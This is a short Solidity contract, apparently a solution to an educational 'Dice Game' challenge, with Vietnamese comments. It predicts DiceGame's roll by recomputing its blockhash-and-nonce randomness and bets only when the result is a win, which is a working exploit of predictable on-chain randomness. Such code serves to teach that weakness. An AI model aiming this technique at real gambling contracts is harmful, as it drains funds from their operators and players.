// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Hàm nhận tiền thưởng từ DiceGame
    receive() external payable {}

    // Hàm Rút tiền 
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    // RiggedRoll
    function riggedRoll() public {
        // Contract phải đủ tiền cược
        require(address(this).balance >= .002 ether, "Not enough ETH to bet");

        // Công thức random của DiceGame
        bytes32 prevHash = blockhash(block.number - 1);
        
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("THE ROLL IS:", roll); // Debug xem trước kết quả

        // Chỉ chơi nếu thắng (roll <= 2)
        require(roll <= 2, "Rolling outcome is not a winner, skipping...");

        // Nếu thắng, gọi hàm rollTheDice và gửi 0.002 ETH
        diceGame.rollTheDice{value: 0.002 ether}();
    }
}